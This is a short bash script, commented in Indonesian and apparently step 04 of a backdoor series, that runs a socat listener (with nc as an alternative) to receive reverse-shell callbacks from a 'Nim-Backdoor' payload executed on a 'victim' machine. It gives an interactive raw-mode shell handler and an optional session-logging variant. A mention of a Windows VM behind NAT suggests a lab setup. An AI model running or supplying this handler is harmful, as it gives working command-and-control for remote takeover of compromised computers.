#!/usr/bin/env bash
# ============================================================
# 04 — Listener / handler untuk Nim-Backdoor callback
#
# Jalankan SEBELUM victim mengeksekusi payload:
#   bash 04-listener.sh [PORT]     (default 4444)
#
# Protokol Nim-Backdoor: text-based (prompt "CWD> " -> command -> output).
# socat raw mode memberi handler interaktif + log koneksi (-d -d).
# Alternatif: nc -lvnp 4444
# ============================================================
set -euo pipefail
PORT="${1:-4444}"

echo "[*] Handler Nim-Backdoor di 0.0.0.0:$PORT"
echo "[*] Menunggu callback dari victim..."
echo "[*] (VM Windows NAT -> host = 10.0.2.2:$PORT)"
echo

socat -d -d TCP-LISTEN:"$PORT",reuseaddr,fork -,raw,echo=0

# Kalau mau logging tiap sesi ke file, pakai versi ini:
# socat -d -d TCP-LISTEN:"$PORT",reuseaddr,fork \
#     EXEC:'script -q -c "cat -" /dev/null',raw,echo=0 2> socat.log
